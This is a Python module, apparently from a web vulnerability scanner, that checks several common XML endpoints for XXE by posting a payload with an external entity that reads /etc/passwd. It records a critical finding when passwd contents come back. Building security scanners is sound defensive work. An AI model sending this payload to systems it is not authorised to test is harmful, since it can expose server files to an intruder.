from core.base import VulnCheck
from colorama import Fore

class XXECheck(VulnCheck):
    def run(self):
        print(Fore.MAGENTA + "[*] Running module: " + self.__class__.__name__)
        print(Fore.CYAN + "\n[+] Checking for XXE vulnerabilities...")
        test_urls = [
            f"{self.scanner.base_url}/api/xml",
            f"{self.scanner.base_url}/xmlrpc.php",
            f"{self.scanner.base_url}/rest/xml",
            f"{self.scanner.base_url}/soap"
        ]
        xxe_payload = """<?xml version='1.0'?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM 'file:///etc/passwd' >]>
<foo>&xxe;</foo>"""

        for url in test_urls:
            try:
                headers = {'Content-Type': 'application/xml'}
                response = self.scanner.session.post(url, data=xxe_payload, headers=headers, verify=False, timeout=10)
                if response.status_code == 200 and ("root:x:0:0" in response.text or "bin:x:1:1" in response.text):
                    self.scanner.vulnerabilities.append({
                        'type': 'XXE Vulnerability',
                        'location': url,
                        'example': f"XXE payload successful at {url}",
                        'severity': 'Critical',
                        'solution': 'Disable external entity processing in XML parsers'
                    })
                    print(Fore.RED + f"[!] XXE vulnerability found at {url}")
            except:
                continue